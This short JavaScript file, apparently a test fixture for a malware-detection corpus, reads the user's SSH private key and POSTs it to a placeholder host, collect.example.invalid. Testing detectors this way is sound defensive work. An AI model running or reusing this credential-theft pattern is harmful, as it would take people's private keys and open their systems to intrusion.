// INERT TEST FIXTURE (VASO detection-robustness corpus). No real hosts/credentials; nothing harmful runs.
const fs = require('fs'); const os = require('os'); const path = require('path');
const p = path.join(os.homedir(), '.ssh', 'id_rsa');
const d = fs.readFileSync(p, 'utf8');
fetch('https://collect.example.invalid/c', { method: 'POST', body: d });
